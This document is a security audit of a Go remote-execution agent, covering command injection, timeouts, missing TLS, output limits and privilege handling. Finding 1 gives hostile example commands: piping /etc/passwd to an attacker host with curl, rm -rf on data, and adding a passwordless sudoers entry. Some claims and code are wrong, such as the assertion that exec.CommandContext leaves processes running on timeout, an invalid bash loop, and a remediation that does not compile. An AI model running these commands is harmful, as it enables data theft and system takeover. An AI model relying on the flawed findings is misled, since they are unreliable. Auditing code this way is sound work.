# Security Review: Agent Binary (client.go + executor.go)

**Date**: 2026-03-25
**Reviewer**: Security Auditor
**Scope**: Agent execution component
**Status**: CRITICAL ISSUES FOUND

---

## Executive Summary

The Agent binary has **3 Critical (P0) vulnerabilities** and **2 High (P1) issues** that must be fixed before production use. The most serious is **unrestricted command injection** via `task.ScriptContent` and **missing timeout process termination** which can create zombie processes.

---

## Detailed Findings

### P0 (Critical) Issues

#### 1. **Unrestricted Command Injection in Script Execution** ⚠️ CRITICAL
**Location**: `/root/bigOps/backend/internal/agent/executor.go:113-122`

```go
func (e *Executor) buildCommand(ctx context.Context, task *pb.ExecuteRequest) *exec.Cmd {
	var cmd *exec.Cmd
	switch task.ScriptType {
	case "python":
		cmd = exec.CommandContext(ctx, "python3", "-c", task.ScriptContent)  // ⚠️ INJECTION HERE
	case "powershell":
		cmd = exec.CommandContext(ctx, "powershell", "-Command", task.ScriptContent)  // ⚠️ INJECTION HERE
	default: // bash
		cmd = exec.CommandContext(ctx, "bash", "-c", task.ScriptContent)  // ⚠️ INJECTION HERE
	}
	...
}
```

**Vulnerability**:
- User-provided `task.ScriptContent` is passed directly to shell interpreters with `-c` flag
- **No validation, sanitization, or escaping** before execution
- Server sends raw script from database → agent executes it without checks
- Example attack:
  ```bash
  # Stored in DB by attacker with admin access
  ScriptContent: "df -h; rm -rf /important/data"
  # Or: "cat /etc/passwd | curl attacker.com/exfil"
  # Or: "chmod 777 /etc/sudoers; echo 'attacker ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"
  ```

**Risk**:
- Script content is **trusted input** from database → no defense at agent level
- Real threat = **compromised database or rogue admin** creating malicious tasks
- Agent has no way to refuse/validate suspicious scripts
- Can escalate privileges if agent runs as root (which it likely does)

**Remediation Options**:
1. **Add script signature verification** (sign scripts on server with HMAC-SHA256, verify on agent)
2. **Implement denylist** for dangerous patterns (`rm -rf`, `dd`, `mkfs`, etc.) - weak but better than nothing
3. **Run agent as non-root** with explicit capabilities (CAP_NET_ADMIN, CAP_SYS_ADMIN only)
4. **Script sandboxing** (SELinux, AppArmor, seccomp) - infrastructure dependent
5. **Code review process** before task creation (not technical but helps)

**Severity**: **P0 - Critical** (Requires privileged actor on server, but no execution safeguards)

---

#### 2. **Process Timeout NOT Enforced - Zombie Process Risk** ⚠️ CRITICAL
**Location**: `/root/bigOps/backend/internal/agent/executor.go:22-29, 74-100`

```go
func (e *Executor) Execute(ctx context.Context, task *pb.ExecuteRequest, stream pb.AgentService_ReportOutputClient) {
	timeout := time.Duration(task.TimeoutSeconds) * time.Second
	if timeout <= 0 {
		timeout = 60 * time.Second
	}

	execCtx, cancel := context.WithTimeout(ctx, timeout)  // ✓ Timeout set
	defer cancel()

	cmd := e.buildCommand(execCtx, task)

	// ... start and stream output ...

	err = cmd.Wait()  // PROBLEM: Wait() on context timeout doesn't kill the process!
	exitCode := 0
	phase := "finished"
	if err != nil {
		if exitErr, ok := err.(*exec.ExitError); ok {
			exitCode = exitErr.ExitCode()
		} else {
			phase = "error"
			exitCode = -1
		}
	}

	// Check if it was a timeout
	if execCtx.Err() == context.DeadlineExceeded {  // ❌ TOO LATE: process already orphaned
		phase = "error"
		exitCode = -1
		stream.Send(&pb.ExecuteResponse{...})
		return
	}
```

**Vulnerability**:
- `context.WithTimeout()` is set on `execCtx`, but `cmd.Wait()` doesn't automatically kill the child process
- When timeout expires:
  1. `execCtx.Done()` is closed
  2. But `cmd.Wait()` continues waiting indefinitely for the child process to exit
  3. Child process keeps running → **becomes zombie**
  4. Only after child naturally exits does `cmd.Wait()` return
- The check for `execCtx.Err() == context.DeadlineExceeded` happens **after** the child has already either exited or orphaned

**Impact**:
- Long-running (runaway) scripts consume agent resources indefinitely
- Example: `while true; do ; done` with 60s timeout → stays alive until manually killed
- Agents can accumulate zombie processes → eventual resource exhaustion
- Agent memory usage increases without bound
- Eventually leads to denial of service

**Remediation**:
```go
// BEFORE cmd.Wait(), must kill the process on timeout
// Option 1: Use cmd.Cancel() (Go 1.21+)
// Option 2: Use syscall.Kill(cmd.Process.Pid, syscall.SIGTERM)
// Option 3: Use cmd.ProcessState to detect timeout and kill

// Better approach:
done := make(chan error, 1)
go func() {
    done <- cmd.Wait()
}()

select {
case <-execCtx.Done():
    // Timeout occurred - kill the process
    if cmd.Process != nil {
        cmd.Process.Kill()  // Send SIGKILL
    }
    <-done  // Wait for goroutine cleanup
    phase = "error"
    exitCode = -1
case err = <-done:
    // Process completed naturally
    ...
}
```

**Severity**: **P0 - Critical** (Resource leaks, eventual DoS)

---

#### 3. **Missing gRPC Error Handling - Silent Failures** ⚠️ CRITICAL
**Location**: `/root/bigOps/backend/internal/agent/executor.go:140-158`

```go
func (c *AgentClient) executeTask(ctx context.Context, executor *Executor, task *pb.ExecuteRequest) {
	log.Printf("Executing task: host_result_id=%d script_type=%s", task.HostResultId, task.ScriptType)

	// Open ReportOutput stream to send results back
	reportStream, err := c.client.ReportOutput(ctx)
	if err != nil {
		log.Printf("Failed to open report stream: %v", err)
		return  // ❌ SILENTLY RETURNS - task result never reaches server
	}

	executor.Execute(ctx, task, reportStream)  // ⚠️ What if this panics?

	_, err = reportStream.CloseAndRecv()
	if err != nil {
		log.Printf("Failed to close report stream: %v", err)
		// ❌ SILENTLY RETURNS - server never knows about failure
	}
}
```

**Vulnerability**:
- If `ReportOutput()` stream fails to open → task silently fails, server left in limbo
- If `executor.Execute()` panics → stream never closes, server timeout
- Server marks task as "pending" forever (timeout after ~24h by infrastructure, not app)
- Example scenario:
  ```
  1. Task dispatched to agent
  2. Agent loses gRPC connection
  3. ReportOutput() fails
  4. Agent logs error and returns
  5. Server never gets "finished" or "error" phase
  6. UI shows task as "running" forever
  ```

**Impact**:
- Difficult debugging (server/agent blame unclear)
- Accumulation of "stuck" executions
- Database bloat (never marked as finished)
- User confusion (did task run or not?)

**Remediation**:
```go
// Send error phase back to server when stream fails
if err != nil {
    // Try alternative path or send via heartbeat fallback
    log.Printf("Failed to open report stream: %v, marking as error", err)
    // Could queue error report to send in next heartbeat
    return
}

// Wrap Execute with panic recovery
defer func() {
    if r := recover(); r != nil {
        log.Printf("Task panic: %v", r)
        reportStream.Send(&pb.ExecuteResponse{
            HostResultId: task.HostResultId,
            Phase:        "error",
            OutputLine:   fmt.Sprintf("Panic: %v", r),
            IsStderr:     true,
            ExitCode:     -1,
            Timestamp:    time.Now().Unix(),
        })
    }
}()

executor.Execute(ctx, task, reportStream)
```

**Severity**: **P0 - Critical** (Task execution visibility lost)

---

### P1 (High) Issues

#### 4. **Output Buffer Overflow - No Size Limits** ⚠️ HIGH
**Location**: `/root/bigOps/backend/internal/agent/executor.go:138-152`

```go
func (e *Executor) streamOutput(stream pb.AgentService_ReportOutputClient, hostResultID int64, reader io.Reader, isStderr bool) {
	scanner := bufio.NewScanner(reader)
	// Increase buffer size for long lines
	scanner.Buffer(make([]byte, 0, 64*1024), 1024*1024)  // 64KB initial, 1MB max per line
	for scanner.Scan() {
		line := scanner.Text()
		stream.Send(&pb.ExecuteResponse{
			HostResultId: hostResultID,
			OutputLine:   line,  // ❌ Unbounded output accumulation
			IsStderr:     isStderr,
			Phase:        "running",
			Timestamp:    time.Now().Unix(),
		})
	}
}
```

**Vulnerability**:
- Each script can produce unlimited output (no per-task output limit)
- Server side concatenates output in memory:
  ```go
  // backend/internal/grpc/server.go:152-155
  if isStderr {
      hr.Stderr += outputLine + "\n"  // ❌ String concatenation unbounded
  } else {
      hr.Stdout += outputLine + "\n"
  }
  ```
- And stores in database:
  ```go
  // MySQL TEXT field = 64KB, MEDIUMTEXT = 16MB
  // Multiple tasks × multiple lines × 10s of agents = OOM
  ```

**Attack Scenario**:
```bash
# Stored task script
ScriptContent: "for i in {1..1000000}; do echo 'very long line with lots of data...'; done"
# Output: ~1GB per agent per execution
# 100 agents × 100 tasks × 1GB = 100GB memory spike
```

**Impact**:
- Agent memory exhaustion → killed by OOM killer
- Server memory exhaustion (accumulating hr.Stdout + hr.Stderr)
- Database bloat (storing 16MB logs × 1000 tasks)
- Network bandwidth waste

**Remediation**:
```go
const MaxOutputPerTask = 100 * 1024 * 1024  // 100MB limit per task

// Track total output size
var totalBytes int64

func (e *Executor) streamOutput(...) {
    scanner := bufio.NewScanner(reader)
    scanner.Buffer(make([]byte, 0, 64*1024), 1024*1024)

    for scanner.Scan() {
        line := scanner.Text()

        // Check size limit
        totalBytes += int64(len(line))
        if totalBytes > MaxOutputPerTask {
            stream.Send(&pb.ExecuteResponse{
                HostResultId: hostResultID,
                OutputLine:   "[OUTPUT TRUNCATED: exceeded 100MB limit]",
                IsStderr:     true,
                Phase:        "running",
                Timestamp:    time.Now().Unix(),
            })
            return
        }

        stream.Send(...)
    }
}
```

**Severity**: **P1 - High** (Impacts availability, requires malicious task in DB)

---

#### 5. **Insecure gRPC Connection - No TLS, No Auth** ⚠️ HIGH
**Location**: `/root/bigOps/backend/internal/agent/client.go:42-52`

```go
func (c *AgentClient) Connect() error {
	conn, err := grpc.NewClient(c.serverAddr,
		grpc.WithTransportCredentials(insecure.NewCredentials()),  // ❌ NO TLS
	)
	if err != nil {
		return fmt.Errorf("grpc dial failed: %w", err)
	}
	c.conn = conn
	c.client = pb.NewAgentServiceClient(conn)
	log.Printf("Connected to server %s", c.serverAddr)
	return nil
}
```

**Vulnerability**:
- No TLS encryption → traffic visible on network
- No certificate validation → susceptible to MITM
- No authentication at gRPC layer → any client can connect
- Server doesn't verify agent identity (only checks `agent_id` field from heartbeat, easily spoofed)

**Attack Scenarios**:
1. **Network eavesdropping**:
   - Script content visible in plaintext (e.g., DB credentials, API keys)
   - Task output (logs, query results) exposed to network tap

2. **Man-in-the-Middle**:
   - Attacker intercepts agent ← → server traffic
   - Injects malicious tasks into heartbeat stream
   - Captures script output

3. **Agent spoofing**:
   - Fake agent connects as `agent_id = "prod-db-01_10.0.0.1"`
   - Receives tasks meant for real agent
   - Or sends fake results

**Remediation**:
- Enable TLS 1.3:
  ```go
  creds, err := credentials.NewClientTLSFromFile(
      "/path/to/ca.crt",
      "server.example.com",
  )
  conn, err := grpc.NewClient(c.serverAddr, grpc.WithTransportCredentials(creds))
  ```
- Add agent authentication via certificates (mTLS) or token
- Server should validate agent certificate common name matches expected agent_id

**Severity**: **P1 - High** (Secrets exposure, task tampering risk)

---

### P2 (Medium) Issues

#### 6. **No RunAsUser Implementation** ⚠️ MEDIUM
**Location**: `/root/bigOps/backend/internal/agent/executor.go:113-135`

```go
func (e *Executor) buildCommand(ctx context.Context, task *pb.ExecuteRequest) *exec.Cmd {
	var cmd *exec.Cmd
	switch task.ScriptType {
	case "python":
		cmd = exec.CommandContext(ctx, "python3", "-c", task.ScriptContent)
	case "powershell":
		cmd = exec.CommandContext(ctx, "powershell", "-Command", task.ScriptContent)
	default:
		cmd = exec.CommandContext(ctx, "bash", "-c", task.ScriptContent)
	}

	if task.WorkDir != "" {
		cmd.Dir = task.WorkDir
	}

	// Set environment variables
	if len(task.Env) > 0 {
		for k, v := range task.Env {
			cmd.Env = append(cmd.Env, fmt.Sprintf("%s=%s", k, v))
		}
	}

	return cmd  // ❌ RunAsUser field from protobuf is NEVER USED
}
```

**Vulnerability**:
- Proto defines `string run_as_user = 9;` but it's completely ignored
- All scripts execute as the agent's user (likely root)
- Server sends `run_as_user` but agent discards it

**Impact**:
- Privilege escalation always happens (no privilege dropping)
- Loss of capability-based access control
- Database tasks can be marked to run as different user, but agent ignores

**Remediation**:
```go
// On Linux, use syscall.SysProcAttr
if task.RunAsUser != "" && task.RunAsUser != "root" {
    // Resolve username to UID
    u, err := user.Lookup(task.RunAsUser)
    if err != nil {
        return nil, fmt.Errorf("invalid user %s: %w", task.RunAsUser, err)
    }

    uid, _ := strconv.Atoi(u.Uid)
    gid, _ := strconv.Atoi(u.Gid)

    cmd.SysProcAttr = &syscall.SysProcAttr{
        Credential: &syscall.Credential{Uid: uint32(uid), Gid: uint32(gid)},
    }
} else {
    // Disallow root scripts
    return nil, errors.New("scripts cannot run as root")
}
```

**Severity**: **P2 - Medium** (Loss of privilege separation, but unlikely mis-configured)

---

#### 7. **Unbounded Goroutines on Agent Shutdown** ⚠️ MEDIUM
**Location**: `/root/bigOps/backend/internal/agent/client.go:61-79, 90-103`

```go
func (c *AgentClient) Run(ctx context.Context) {
	for {
		select {
		case <-ctx.Done():
			return
		default:
		}

		err := c.heartbeatLoop(ctx)
		if err != nil {
			log.Printf("Heartbeat stream ended: %v, reconnecting in %s...", err, reconnectDelay)
		}

		select {
		case <-ctx.Done():
			return
		case <-time.After(reconnectDelay):  // 5 second delay
		}
	}
}

func (c *AgentClient) heartbeatLoop(ctx context.Context) error {
	stream, err := c.client.Heartbeat(ctx)
	...

	// Goroutine to receive server responses (including task assignments)
	executor := NewExecutor()
	go func() {  // ❌ Launched goroutine never joins
		for {
			resp, err := stream.Recv()
			if err != nil {
				log.Printf("Heartbeat recv error: %v", err)
				return  // ❌ Goroutine exits but may be waiting on I/O
			}
			if resp.Task != nil {
				log.Printf("Received task: execution_id=%d host_result_id=%d",
					resp.Task.ExecutionId, resp.Task.HostResultId)
				go c.executeTask(ctx, executor, resp.Task)  // ❌ Another unjoined goroutine
			}
		}
	}()
	...
}

func (c *AgentClient) executeTask(ctx context.Context, executor *Executor, task *pb.ExecuteRequest) {
	// Opens ReportOutput stream
	reportStream, err := c.client.ReportOutput(ctx)
	...
	executor.Execute(ctx, task, reportStream)  // Could take 5+ minutes
	// If ctx.Cancel() is called during Execute, this goroutine orphans
}
```

**Vulnerability**:
- When `signal.Notify(quit, ...)` fires (SIGTERM), `cancel()` is called
- All `ctx.Done()` channels close, but executing tasks' goroutines don't get reaped
- Race condition: `executeTask()` goroutines still running during shutdown
- Example:
  ```
  1. Agent receives SIGTERM
  2. Main goroutine calls cancel()
  3. heartbeatLoop returns
  4. Run() returns
  5. main() exits
  6. But executeTask goroutines (5+ running, 3 awaiting gRPC Send) still trying to use closed conn
  ```

**Impact**:
- Graceful shutdown not enforced
- Potential data corruption if Stdout/Stderr writes race with exit
- Task results may not be delivered to server
- Goroutine leaks over time

**Remediation**:
```go
func (c *AgentClient) Run(ctx context.Context) {
	var wg sync.WaitGroup

	for {
		select {
		case <-ctx.Done():
			wg.Wait()  // Wait for all task goroutines to finish
			return
		...
		}
	}
}

func (c *AgentClient) executeTask(ctx context.Context, executor *Executor, task *pb.ExecuteRequest) {
	wg.Add(1)
	defer wg.Done()

	...
	executor.Execute(ctx, task, reportStream)
	...
}
```

**Severity**: **P2 - Medium** (Data loss on shutdown, not exploitable)

---

#### 8. **Default Timeout Too Low (60s)** ⚠️ MEDIUM
**Location**: `/root/bigOps/backend/internal/agent/executor.go:23-26`

```go
timeout := time.Duration(task.TimeoutSeconds) * time.Second
if timeout <= 0 {
    timeout = 60 * time.Second  // ❌ Very short for typical maintenance tasks
}
```

**Issue**:
- Many system maintenance tasks take > 60 seconds:
  - Large database migrations: 5-30 minutes
  - Backup verification: 10+ minutes
  - Full disk scans: 20+ minutes
  - Kernel compilation: hours
- If timeout not specified (or 0), defaults to 60s → task killed unexpectedly

**Remediation**:
- Default to 300s (5 minutes) or higher
- Better: Require explicit timeout, no default
- Document timeout expectations in UI

---

### P3 (Low) Issues

#### 9. **No Agent Identity Rotation** ⚠️ LOW
- `agent_id = hostname + "_" + ip` is deterministic, can be spoofed by hostname/IP changes
- No ephemeral agent tokens or certificates
- Acceptable for V1 if agents are managed infrastructure

#### 10. **File Transfer Not Implemented** ⚠️ LOW
- Proto defines `FileTransfer` RPC but server stub just discards chunks
- Acceptable for V1, but complete before production

---

## Summary Table

| # | Issue | Type | Severity | Impact | Fix Time |
|---|-------|------|----------|--------|----------|
| 1 | Command injection via ScriptContent | Security | **P0** | Arbitrary code execution | 1-2h (signing) |
| 2 | Timeout doesn't kill process | Bug | **P0** | Resource leaks, DoS | 1-2h |
| 3 | Silent gRPC failures | Bug | **P0** | Task visibility lost | 1-2h |
| 4 | Output buffer overflow | Resource | **P1** | OOM, DoS | 2-3h |
| 5 | No TLS/Auth on gRPC | Security | **P1** | MITM, data exposure | 2-3h |
| 6 | RunAsUser not implemented | Security | **P2** | Privilege always root | 2-3h |
| 7 | Unbounded goroutines | Concurrency | **P2** | Graceful shutdown fails | 2-3h |
| 8 | Default timeout too low | Config | **P2** | Tasks killed early | 0.5h |
| 9 | Agent identity spoofable | Security | **P3** | Task misdirection | Design review |
| 10 | FileTransfer stub | Feature | **P3** | Not implemented | Deferred |

---

## Risk Assessment

**Current production readiness**: ❌ **NOT SUITABLE FOR PRODUCTION**

**Blocker issues** (must fix before any deployment):
1. P0 Process timeout enforcement
2. P0 gRPC error handling / task visibility
3. P1 TLS/auth on gRPC

**Important but deferrable** (fix in v1.1):
- P0 Command injection protection (if deployment accepts privileged DB access risk)
- P1 Output size limits
- P2 RunAsUser enforcement

---

## Recommendations

### Immediate Actions (Before v1.0 Release)
1. ✅ Fix process timeout with explicit kill
2. ✅ Add panic recovery + error stream for gRPC failures
3. ✅ Enable TLS 1.3 + mTLS authentication
4. ✅ Add output size limits (100-500MB per task)
5. ✅ Raise default timeout to 5 minutes or remove default

### Short Term (v1.1)
1. Implement script signature verification (HMAC-SHA256 with server-agent shared key)
2. Implement RunAsUser privilege dropping
3. Add goroutine lifecycle management (WaitGroup)
4. Complete FileTransfer RPC implementation
5. Agent certificate rotation mechanism

### Long Term (v2.0)
1. Script sandbox (SELinux/AppArmor profiles per script type)
2. Agent policy engine (denylist for commands, paths, env vars)
3. Audit logging of all task executions
4. Rate limiting per agent/per script

---

## Testing Recommendations

```bash
# 1. Test process cleanup on timeout
timeout_test() {
    # Create task with script: sleep 300
    # Set timeout to 5 seconds
    # Verify process killed after 5s, not left running
    ps aux | grep sleep  # Should be empty
}

# 2. Test output truncation
output_test() {
    # Create task: dd if=/dev/zero bs=1M count=200
    # Verify output stops at 100MB limit
    # Verify error message sent to server
}

# 3. Test gRPC failure handling
grpc_failure_test() {
    # Kill agent's gRPC connection during execution
    # Verify: (a) server knows task failed, (b) agent logs error, (c) no hang
}

# 4. Test TLS verification
tls_test() {
    # Try connecting without cert
    # Verify: connection refused
    # Try MITM attack on non-TLS port
    # Verify: no traffic accepted on non-TLS
}
```

---

## Sign-Off

This review covers security, resource safety, and reliability. The Agent binary requires P0/P1 fixes before use in any environment with sensitive data or strict availability requirements.

**Reviewer Signature**: Security Auditor
**Date**: 2026-03-25
